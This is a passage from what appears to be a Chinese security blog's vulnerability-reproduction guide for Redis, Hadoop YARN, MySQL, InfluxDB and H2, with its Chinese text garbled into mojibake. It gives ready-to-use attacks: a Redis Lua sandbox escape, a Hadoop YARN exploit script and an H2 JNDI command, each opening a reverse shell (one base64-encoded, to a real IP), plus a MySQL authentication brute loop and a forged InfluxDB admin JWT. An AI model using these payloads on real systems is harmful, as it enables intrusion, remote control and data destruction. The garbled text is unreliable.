ä¸­è¿è¡Œåœ¨ä¸€ä¸ªè¢«ç§°ä¸ºâ€œæ²™ç®±â€çš„ç¯å¢ƒä¸­ï¼Œè¯¥ç¯å¢ƒåº”é™åˆ¶è„šæœ¬åªèƒ½æ‰§è¡Œå®‰å…¨çš„æ“ä½œï¼Œé˜»æ­¢è®¿é—®å¤–éƒ¨ç³»ç»Ÿèµ„æºï¼Œå¦‚æ–‡ä»¶ç³»ç»Ÿæˆ–ç³»ç»Ÿå‡½æ•°ã€‚ç„¶è€Œï¼Œç”±äº Debian å’Œ Ubuntu çš„æ‰“åŒ…é”™è¯¯ï¼ŒLua æ²™ç®±ä¸­é”™è¯¯åœ°åŒ…å«äº† package å¯¹è±¡ã€‚<br>2.2 &lt;&#x3D; redis &lt; 5.0.13ã€2.2 &lt;&#x3D; redis &lt; 6.0.15ã€2.2 &lt;&#x3D; redis &lt; 6.2.5ï¼Œé¦–å…ˆéœ€è¦èƒ½å¤ŸæˆåŠŸç™»é™†redisï¼Œä¹‹åä½¿ç”¨ä¸‹é¢çš„payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;whoami&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> 0</span><br></pre></td></tr></table></figure><p>payloadçš„whoamiä¸ºå¯ä»¥æ‰§è¡Œçš„ä»»æ„ç³»ç»Ÿå‘½ä»¤ä½ç½®ï¼Œå¯ä»¥æ¢æˆidæˆ–è€…pwdç­‰ç­‰<br>æ¼æ´åŸç†ï¼š<br>å› ä¸ºDebianä»¥åŠUbuntuå‘è¡Œç‰ˆçš„æºåœ¨æ‰“åŒ…Redisæ—¶ï¼Œä¸æ…åœ¨Luaæ²™ç®±ä¸­é—ç•™äº†ä¸€ä¸ªå¯¹è±¡package<br>æ”»å‡»è€…å¯é€šè¿‡packageä¸­çš„loadlibå‡½æ•°æ¥åŠ è½½åŠ¨æ€é“¾æ¥åº“&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0ä¸­çš„å‡½æ•°luaopen_ioï¼Œåœ¨Luaä¸­æ‰§è¡Œè¿™ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œå³å¯è·å¾—ioåº“ï¼Œå†ä½¿ç”¨å…¶æ‰§è¡Œå‘½ä»¤ã€‚<br>POCè§£æï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);    // é€šè¿‡loadlibå‡½æ•°åŠ è½½åŠ¨æ€è¿æ¥åº“ä¸­çš„luaopen_ioå‡½æ•°ï¼Œå¹¶èµ‹ç»™io_l</span><br><span class="line">local io = io_l();    // æ‰§è¡Œio_l()ï¼Œè·å–ioåº“</span><br><span class="line">local f = io.popen(&quot;whoami&quot;, &quot;r&quot;);     // é€šè¿‡ioåº“ä¸­çš„popenæ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶æŠŠæ‰§è¡Œç»“æœè¿”å›èµ‹ç»™f</span><br><span class="line">local res = f:read(&quot;*a&quot;);    // è¯»å–fä¸­å‘½ä»¤æ‰§è¡Œçš„ç»“æœå†…å®¹</span><br><span class="line">f:close();    // å…³é—­f</span><br><span class="line">return res    // å°†è¯»å–çš„ç»“æœå†…å®¹è¿”å›</span><br></pre></td></tr></table></figure><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><p>Hadoopæ˜¯ä¸€ä¸ªç”±ApacheåŸºé‡‘ä¼šå¼€å‘çš„åˆ†å¸ƒå¼ç³»ç»ŸåŸºç¡€æ¶æ„ï¼Œä¸»è¦è§£å†³æµ·é‡æ•°æ®çš„å­˜å‚¨å’Œåˆ†æè®¡ç®—é—®é¢˜ã€‚Hadoopçš„ä¸»è¦ç”¨äºï¼š</p><ul><li>åˆ†å¸ƒå¼å­˜å‚¨ï¼šé€šè¿‡Hadoopåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿï¼ˆHDFSï¼‰ï¼ŒHadoopèƒ½å¤Ÿå­˜å‚¨æµ·é‡æ•°æ®ï¼Œæä¾›é«˜ååé‡çš„æ•°æ®è®¿é—®ã€‚</li><li>åˆ†å¸ƒå¼è®¡ç®—ï¼šåˆ©ç”¨MapReduceç¼–ç¨‹æ¨¡å‹ï¼ŒHadoopèƒ½å¤Ÿå¤„ç†å¤§é‡æ•°æ®é›†ï¼Œæ‰§è¡Œå¹¶è¡Œè®¡ç®—ä»»åŠ¡ï¼Œæé«˜æ•°æ®å¤„ç†æ•ˆç‡ã€‚</li><li>æ•°æ®æŒ–æ˜å’Œåˆ†æï¼šHadoopæ”¯æŒå¤æ‚çš„æ•°æ®åˆ†æå’Œæ•°æ®æŒ–æ˜ä»»åŠ¡ï¼Œå¸®åŠ©ç”¨æˆ·ä»å¤§è§„æ¨¡æ•°æ®é›†ä¸­æå–æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚<br>Hadoop YARNçš„ResourceManageræ˜¯é›†ç¾¤èµ„æºåˆ†é…å’Œè°ƒåº¦çš„å…³é”®ï¼Œè‹¥å‡ºç°æœªæˆæƒè®¿é—®æ¼æ´ï¼Œå¯èƒ½ä½¿æœªè®¤è¯ç”¨æˆ·è®¿é—®æˆ–æ“çºµèµ„æºï¼Œå¼•å‘æ•°æ®æ³„éœ²ã€èµ„æºæ»¥ç”¨æˆ–æœåŠ¡ä¸­æ–­ã€‚æ­¤ç±»å®‰å…¨é—®é¢˜éœ€åŠæ—¶ä¿®å¤ï¼Œä»¥ä¿æŠ¤é›†ç¾¤å®‰å…¨ã€‚<br>è¯¥æ¼æ´æ¶‰åŠç‰ˆæœ¬ï¼šhadoop 3.3.0ä»¥ä¸‹,è®¿é—®&#x2F;cluster&#x2F;appsé¡µé¢ï¼šï¼ˆè¯¥é¡µé¢å­˜åœ¨è¯´æ˜å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼‰<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨ä»¥ä¸‹å®˜æ–¹expåå¼¹shell</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.0.1&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>è¿™æ®µ Python è„šæœ¬æ˜¯ä¸€ä¸ªé’ˆå¯¹ Hadoop YARN (Yet Another Resource Negotiator) çš„æ¼æ´åˆ©ç”¨ï¼ˆexploitï¼‰ç¤ºä¾‹ï¼Œç”¨äºåå¼¹ Shell åˆ°æŒ‡å®šçš„ç›‘å¬å™¨ã€‚è¿™ä¸ªè„šæœ¬çš„åŸç†æ˜¯é€šè¿‡æœªç»æˆæƒçš„ API è®¿é—®å‘ YARN æäº¤ä¸€ä¸ªæ¶æ„åº”ç”¨ï¼Œç„¶ååˆ©ç”¨ YARN çš„åº”ç”¨ç®¡ç†æœºåˆ¶æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</li></ul><ol><li><strong>è®¾ç½®ç›®æ ‡å’Œç›‘å¬ä¸»æœº</strong>ï¼š<ul><li><code>target</code> è®¾ç½®ä¸º YARN ResourceManager çš„ Web æ¥å£ã€‚</li><li><code>lhost</code> è®¾ç½®ä¸ºæ”»å‡»è€…çš„ç›‘å¬ IP åœ°å€ï¼Œç”¨äºæ¥æ”¶åå¼¹çš„ Shellã€‚</li></ul></li><li><strong>è¯·æ±‚æ–°åº”ç”¨ ID</strong>ï¼š<ul><li>è„šæœ¬é¦–å…ˆå‘ YARN çš„ <code>ws/v1/cluster/apps/new-application</code> å‘é€ POST è¯·æ±‚ï¼Œè¿™ä¸ª API è°ƒç”¨ç”¨äºè·å–ä¸€ä¸ªæ–°çš„åº”ç”¨ç¨‹åº IDã€‚</li><li>å“åº”ä¸­åŒ…å« <code>application-id</code>ï¼Œè¿™æ˜¯åç»­æäº¤åº”ç”¨æ—¶å¿…é¡»ä½¿ç”¨çš„ã€‚</li></ul></li><li><strong>æ„é€ æ¶æ„åº”ç”¨æ•°æ®</strong>ï¼š<ul><li>æ¥ä¸‹æ¥ï¼Œè„šæœ¬æ„å»ºä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ JSON æ•°æ®ä½“ã€‚</li><li><code>application-id</code> æ˜¯ä»å‰ä¸€æ­¥è·å–çš„ IDã€‚</li><li><code>application-name</code> å¯ä»¥æ˜¯ä»»æ„åç§°ï¼Œåœ¨è¿™é‡Œè®¾ç½®ä¸º â€˜get-shellâ€™ã€‚</li><li><code>am-container-spec</code> æ˜¯ YARN ä¸­ç®¡ç†åº”ç”¨ç”Ÿå‘½å‘¨æœŸçš„ç»„ä»¶ï¼Œå…¶ä¸­ <code>commands</code> å­—æ®µç”¨äºå®šä¹‰åº”ç”¨å¯åŠ¨æ—¶æ‰§è¡Œçš„å‘½ä»¤ã€‚è¿™é‡Œçš„å‘½ä»¤æ˜¯ä¸€ä¸ªå…¸å‹çš„åå¼¹ Shell å‘½ä»¤ <code>/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1</code>ï¼Œè¿™æ¡å‘½ä»¤å°è¯•åˆ›å»ºä¸€ä¸ªåˆ°æ”»å‡»è€… <code>lhost</code> ä¸Š 9999 ç«¯å£çš„åå‘ TCP è¿æ¥ã€‚</li><li><code>application-type</code> è®¾ç½®ä¸º â€˜YARNâ€™ï¼Œè¿™æŒ‡å®šäº†åº”ç”¨ç¨‹åºç±»å‹ã€‚</li></ul></li><li><strong>æäº¤æ¶æ„åº”ç”¨å¹¶è§¦å‘æ‰§è¡Œ</strong>ï¼š<ul><li>æœ€åï¼Œè„šæœ¬å°†åŒ…å«æ¶æ„æ•°æ®çš„ JSON å‘é€åˆ° <code>ws/v1/cluster/apps</code>ï¼Œé€šè¿‡ POST è¯·æ±‚å®é™…æäº¤å¹¶å°è¯•å¯åŠ¨è¿™ä¸ªåº”ç”¨ã€‚</li><li>å¦‚æœ YARN æœªæ­£ç¡®é…ç½®å®‰å…¨æ§åˆ¶ï¼Œè¿™ä¸ªè¯·æ±‚å°†æˆåŠŸï¼ŒYARN å°†æŒ‰ç…§æä¾›çš„æ¶æ„å‘½ä»¤æ‰§è¡Œï¼Œå¯¼è‡´åœ¨æŒ‡å®šçš„ IP å’Œç«¯å£ä¸Šæ‰“å¼€ä¸€ä¸ªåå‘ Shellã€‚</li></ul></li></ol><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="CVE-2012-2122-æœªæˆæƒè¿œç¨‹è®¿é—®"><a href="#CVE-2012-2122-æœªæˆæƒè¿œç¨‹è®¿é—®" class="headerlink" title="CVE-2012-2122 æœªæˆæƒè¿œç¨‹è®¿é—®"></a>CVE-2012-2122 æœªæˆæƒè¿œç¨‹è®¿é—®</h3><p>CVE-2012-2122 å½±å“çš„æ˜¯ MySQL 5.1.x ç‰ˆæœ¬åˆ° 5.1.61ï¼ŒMySQL 5.5.x ç‰ˆæœ¬åˆ° 5.5.24ï¼Œä»¥åŠæŸäº› 5.0 ç‰ˆæœ¬ã€‚è¿™ä¸ªæ¼æ´ä¸»è¦å½±å“è¿è¡Œåœ¨ Linuxã€OS Xã€Solaris å¹³å°çš„ MySQL ç‰ˆæœ¬ï¼ŒWindows ç‰ˆæœ¬ç”±äºè®¤è¯å®ç°çš„å·®å¼‚é€šå¸¸ä¸å—å½±å“ã€‚<br>æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹ç®€å•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡é‡å¤å°è¯•ä½¿ç”¨é”™è¯¯çš„å¯†ç ç™»å½•ï¼Œç›´åˆ°ç”±äºå†…å­˜æ¯”è¾ƒçš„é”™è¯¯å¯¼è‡´æˆåŠŸç™»å½•ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½åªéœ€è¦å°è¯•çº¦ 256 æ¬¡å³å¯æˆåŠŸç»•è¿‡è®¤è¯ã€‚è¿™ç§åˆ©ç”¨æ–¹å¼ä¸éœ€è¦ç‰¹åˆ«å¤æ‚çš„æŠ€æœ¯ï¼Œæ™®é€šçš„è„šæœ¬å·¥å…·å°±èƒ½å®Œæˆã€‚</p><p>è¯¥æ¼æ´æºäº MySQL æœåŠ¡ç«¯åœ¨éªŒè¯ç”¨æˆ·å¯†ç æ—¶çš„ä¸€ä¸ªé€»è¾‘é”™è¯¯ã€‚åœ¨ MySQL ä¸­ï¼Œå®¢æˆ·ç«¯å‘é€çš„å¯†ç æ˜¯ä¸€ä¸ªæ•£åˆ—å€¼ï¼ŒæœåŠ¡ç«¯ä¼šå°†è¿™ä¸ªæ•£åˆ—ä¸æœŸæœ›çš„æ•£åˆ—å€¼è¿›è¡Œæ¯”è¾ƒã€‚é—®é¢˜å‡ºåœ¨æ¯”è¾ƒè¿™ä¸¤ä¸ªæ•£åˆ—å€¼çš„å‡½æ•°ä¸Šï¼ˆ<code>memcmp()</code>ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°åœ¨æŸäº›æƒ…å†µä¸‹ä¼šç”±äº CPU æ¶æ„çš„é—®é¢˜é”™è¯¯åœ°è¿”å› 0ï¼ˆå³è®¤ä¸ºä¸¤ä¸ªæ•£åˆ—å€¼ç›¸ç­‰ï¼‰ï¼Œå°¤å…¶æ˜¯åœ¨ x86 æ¶æ„çš„å¤„ç†å™¨ä¸Šã€‚<br>POCï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done</span><br></pre></td></tr></table></figure><p>åœ¨ MySQL æºä»£ç ä¸­ï¼Œæ¼æ´ç›¸å…³çš„éƒ¨åˆ†ä¸»è¦æ˜¯ <code>sql/password.c</code> ä¸­çš„ <code>check_scramble()</code> å‡½æ•°ã€‚é—®é¢˜ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my_bool <span class="title function_">check_scramble</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *scramble_arg, <span class="type">const</span> <span class="type">char</span> *message, <span class="type">const</span> ulong *hash_stage2)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcmp</span>(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE * <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°åœ¨æ¯”è¾ƒä¸¤ä¸ªæ•£åˆ—å€¼æ—¶å¯èƒ½ä¼šå› ä¸ºå¤„ç†å™¨çš„ä¼˜åŒ–æ–¹å¼å’Œå†…å­˜å¯¹é½é—®é¢˜å¯¼è‡´é¢„æœŸå¤–çš„ç»“æœã€‚</p><h2 id="InfluxDB"><a href="#InfluxDB" class="headerlink" title="InfluxDB"></a>InfluxDB</h2><p>InfluxDBæ˜¯ä¸€æ¬¾æ—¶åºæ•°æ®åº“ï¼Œå…¶ä½¿ç”¨JWTä½œä¸ºé‰´æƒæ–¹å¼ã€‚åœ¨å…¶1.7.6ç‰ˆæœ¬ä»¥å‰ï¼Œé»˜è®¤è®¾ç½®JWTçš„è®¤è¯å¯†é’¥shared-secretä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·èº«ä»½åœ¨InfluxDBä¸­æ‰§è¡ŒSQLè¯­å¥ã€‚æ¼æ´åŸç†æ˜¯1.7.6ä¹‹å‰çš„InfluxDBåœ¨services&#x2F;httpd&#x2F;handler.goä¸­çš„èº«ä»½éªŒè¯å‡½æ•°ä¸­å­˜åœ¨èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼Œå› ä¸ºJWTä»¤ç‰Œå¯èƒ½å…·æœ‰ç©ºçš„å…±äº«å¯†é’¥ï¼ˆä¹Ÿè¢«ç§°ä¸ºå…±äº«å¯†é’¥ï¼‰ã€‚</p><p>ç¬¬ä¸€æ­¥ï¼šè®¿é—® <a href="http://ipåœ°å€:8086/debug/vars">http://IPåœ°å€:8086/debug/vars</a> æŸ¥çœ‹èƒ½ä¸èƒ½è®¿é—®åˆ°ç³»ç»Ÿçš„æœåŠ¡ä¿¡æ¯ï¼Œå¦‚æœèƒ½ åˆ™å¯èƒ½å­˜åœ¨æ¼æ´.ï¼ˆ8086 æ˜¯é»˜è®¤ç«¯å£.ï¼‰<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image.png"><br>ç¬¬äºŒæ­¥ï¼šè®¿é—® <a href="http://ipåœ°å€:8086/query">http://IPåœ°å€:8086/query</a> æŸ¥çœ‹æŸ¥è¯¢åŠŸèƒ½æ˜¯å¦ä¼šæœ‰æç¤ºéœ€è¦ç™»å½•ã€‚<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-1.png"><br>ç¬¬ä¸‰æ­¥ï¼šæ·»åŠ  POST è¯·æ±‚å€¼.<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-2.png"><br>ç¬¬å››æ­¥ï¼šè®¿é—® URL ï¼Œç„¶åç”¨ Burp è¿›è¡ŒæŠ“åŒ…ï¼Œå†å‘ç»™ Repeaterï¼ˆé‡å‘å™¨ï¼‰<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-3.png"><br>ç¬¬äº”æ­¥ï¼šé€šè¿‡ JSON Web Tokens - jwt.io ç”Ÿæˆæ‰€éœ€è¦çš„ Tokenï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">3751718877</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>usernameéœ€è¦å·²å­˜åœ¨çš„ç”¨æˆ·æ‰è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨ admin ç”¨æˆ·å°±å¥½.expæ˜¯æ—¶é—´æˆ³ ï¼Œè¿™ä¸ªæ—¶é—´æˆ³ä¸€å®šè¦æ˜¯æœªæ¥çš„æ—¶é—´æ‰è¡Œï¼Œè¿™é‡Œç”Ÿæˆäº†ä¸€ä¸ª 2088 å¹´çš„æ—¶é—´æˆ³ï¼ˆæ‰€ä»¥æˆ‘ä¸‹é¢çš„Encodedå€¼å¯ä»¥ç›´æ¥ç”¨ï¼‰ï¼š3751718877ï¼š <a href="https://www.beijing-time.org/shijianchuo">https://www.beijing-time.org/shijianchuo</a><br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-4.png"><br>ç¬¬å…­æ­¥ï¼šåœ¨ Burp æŠ“åŒ…çš„æ•°æ®åŒ…ä¸­æ·»åŠ  Authorization: Bearer (åé¢å°±æ˜¯ Encoded ç”Ÿæˆçš„å€¼)ã€è¿™ä¸ªå¯ä»¥ç›´æ¥ç”¨ï¼Œå› ä¸ºæ—¶é—´æˆ³çš„ç»“æŸæ˜¯2088å¹´ã€‘<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-5.png"><br>ç¬¬ä¸ƒæ­¥ï¼šå¦‚æœè¦è¿›è¡Œå…¶ä»–æ“ä½œåˆ™ä¿®æ”¹ q&#x3D; ä½ æƒ³è¦æŸ¥çœ‹çš„ä¿¡æ¯å°±è¡Œã€‚<br>show users# æ˜¾ç¤ºç”¨æˆ·<br>show databases# æ˜¾ç¤ºæ•°æ®åº“<br>create database xxx# åˆ›å»ºxxxæ•°æ®åº“<br>drop database xxx# åˆ é™¤xxxæ•°æ®åº“<br>create user influx with password â€˜***â€™ with all privileges;# åˆ›å»ºç”¨æˆ·<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-6.png"></p><h2 id="H2database-æœªæˆæƒè®¿é—®"><a href="#H2database-æœªæˆæƒè®¿é—®" class="headerlink" title="H2database æœªæˆæƒè®¿é—®"></a>H2database æœªæˆæƒè®¿é—®</h2><p>H2æ•°æ®åº“æ˜¯ä¸€ä¸ªçº¯Javaå¼€å‘çš„å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰ï¼Œå®ƒæ”¯æŒSQLå’ŒJDBCæ ‡å‡†ï¼Œå…·æœ‰é«˜æ€§èƒ½ã€å°å·§ã€æ˜“äºä½¿ç”¨å’Œéƒ¨ç½²ç­‰ç‰¹ç‚¹ã€‚åŒæ—¶ï¼Œå®ƒè¿˜æ”¯æŒåµŒå…¥å¼ã€å†…å­˜å’Œåˆ†å¸ƒå¼æ¨¡å¼ï¼Œå¯ä»¥æ»¡è¶³ä¸åŒåœºæ™¯çš„éœ€æ±‚ã€‚</p><p>H2æ•°æ®åº“çš„ç‰¹ç‚¹ï¼š<br>1.é«˜æ€§èƒ½ï¼šH2ä½¿ç”¨çº¯Javaå¼€å‘ï¼Œåœ¨æ€§èƒ½ä¸Šæ¯”å…¶ä»–Javaæ•°æ®åº“æ›´æœ‰ä¼˜åŠ¿ï¼ŒåŒæ—¶æ”¯æŒå¤šç§å­˜å‚¨å¼•æ“ï¼Œå¦‚å†…å­˜ã€ç£ç›˜ç­‰ã€‚<br>2.å°å·§ï¼šH2çš„å®‰è£…åŒ…éå¸¸å°ï¼Œå¯ä»¥è½»æ¾éƒ¨ç½²ï¼Œä¹Ÿä¸éœ€è¦å®‰è£…å¤æ‚çš„æ•°æ®åº“æœåŠ¡ï¼Œåªè¦å®‰è£…JREå³å¯ã€‚<br>3.æ˜“äºä½¿ç”¨ï¼šH2å…·æœ‰ç®€å•æ˜“ç”¨çš„å›¾å½¢ç•Œé¢ï¼Œæ”¯æŒä¸°å¯Œçš„æ ‡å‡†SQLå’ŒJDBCæ¥å£ï¼Œå¹¶æä¾›è¯¦ç»†çš„æ–‡æ¡£å’Œç¤ºä¾‹ï¼Œå¯ä»¥å¿«é€Ÿä¸Šæ‰‹ã€‚<br>4.éƒ¨ç½²çµæ´»ï¼šH2æ”¯æŒåµŒå…¥å¼ã€å†…å­˜å’Œåˆ†å¸ƒå¼æ¨¡å¼ï¼Œå¯æ»¡è¶³ä¸åŒåº”ç”¨åœºæ™¯çš„éœ€æ±‚ï¼Œä¾‹å¦‚Webåº”ç”¨ã€æ¡Œé¢åº”ç”¨ç­‰ã€‚<br>H2æ•°æ®åº“æ˜¯ä¸€æ¬¾å°å·§ã€é«˜æ€§èƒ½ã€æ˜“äºä½¿ç”¨å’Œéƒ¨ç½²çš„Javaæ•°æ®åº“ï¼Œéå¸¸é€‚åˆä¸­å°å‹åº”ç”¨çš„å¼€å‘å’Œéƒ¨ç½²ã€‚</p><p>H2 æ•°æ®åº“æ§åˆ¶å°ä¸­çš„å¦ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„ RCE æ¼æ´ï¼Œåœ¨v2.1.210+ä¸­ä¿®å¤ã€‚2.1.210 ä¹‹å‰çš„H2æ§åˆ¶å°å…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡åŒ…å«å­å­—ç¬¦ä¸²çš„jdbc:h2:mem JDBC URLæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>æ¼æ´å¤ç°ï¼š<br>è®¿é—®http:&#x2F;&#x2F;è™šæ‹Ÿæœºip:8080&#x2F;h2-console&#x2F;<br>æ‰“å¼€ä¹‹åæ˜¯ä¸€ä¸ªè®¿é—®çš„é¡µé¢ï¼Œæˆ‘ä»¬éœ€è¦ç”¨javaè¯­è¨€é©±åŠ¨è®©è¿™ä¸ªç½‘ç«™ä¸»åŠ¨è®¿é—®å…¶ä»–ä¸»æœºå¹¶ä¸”æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦ç”¨åˆ°ä¸€å¼€å§‹å†™åœ¨æœ€å‰é¢çš„å·¥å…·è¿›è¡Œç”Ÿæˆrmiå·¥å…·ï¼ˆ<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0%EF%BC%89%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A">https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0ï¼‰åŸºç¡€ä½¿ç”¨æ–¹æ³•ï¼š</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C å‘½ä»¤ -A æ”»å‡»è€…çš„ipï¼ˆç›‘å¬è€…çš„ipï¼Œå¡«ä½ è‡ªå·±çš„ï¼‰</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDcuMTEvNTU2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 8.130.107.11//å­¦äº†å¤§ä½¬çš„åå¼¹shellï¼Œä½†æ˜¯ä¸€zhiå¤±è´¥</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A 192.168.43.156//è¿™æ¡æˆåŠŸäº†</span><br></pre></td></tr></table></figure><p>åœ¨é©±åŠ¨é€‰æ‹©ï¼šjavax.naming.InitialContext<br>urlé€‰æ‹©é€‰æ‹©ä¸€ä¸ªrmiå¡«å†™<br>å‡ºç°ä¸‹æ–¹çº¢è‰²çš„å­—ä½“å°±æˆåŠŸäº†ï¼ŒåŒæ—¶ä½ çš„ä¸»æœºæ£€æµ‹åˆ°äº†è¿™ä¸ªç½‘ç«™çš„è®¿é—®<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-7.png"></p><h2 id="CouchDB"><a href="#CouchDB" class="headerlink" 